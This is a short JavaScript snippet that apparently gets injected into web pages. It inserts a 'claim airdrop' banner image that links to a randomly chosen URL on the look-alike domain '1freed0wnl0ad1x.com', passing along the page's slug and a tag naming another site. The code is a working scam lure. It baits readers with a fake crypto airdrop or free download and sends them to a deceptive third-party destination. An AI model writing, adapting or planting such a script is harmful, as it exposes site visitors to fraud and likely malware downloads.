function random(min, max) {
	return Math.floor(Math.random() * (max - min + 1)) + min;
}

var hs = window.location.host;
var hs2 = window.location.href;
var ua = navigator.userAgent;	
				
direct_link_lists=[
	'https://1freed0wnl0ad1x.com/z8rh1b349be0fa635c9637ee17ba5d91fe67ee307c856',
	'https://1freed0wnl0ad1x.com/mIrywd9788fcc628661bef520182482851efe7e37fca9',
	'https://1freed0wnl0ad1x.com/0Zrmjf343f6ca39734fc783c1c970051fe833549de0b2',
];
		
function getURL() {
	return direct_link_lists[random(0, (direct_link_lists.length - 1))];
}

var url = window.location.href.replace('https://', '');

var parse_url = url.split('/');
var parse_url_lists = parse_url[2].replace('.html', '').split('-').join(' ');
var direct_link = getURL()+'?q='+encodeURI(parse_url_lists)+'&s2=mundourbano.me';

document.write('<a href="'+direct_link+'" style="margin-left: 1em; margin-right: 1em;" target="_blank" title="claim airdrop" rel="sponsored"><img alt="claim airdrop" data-original-height="250" data-original-width="300" src="https://kyubi18.github.io/CLAIM.png" width="300" height="250"><\/a>')
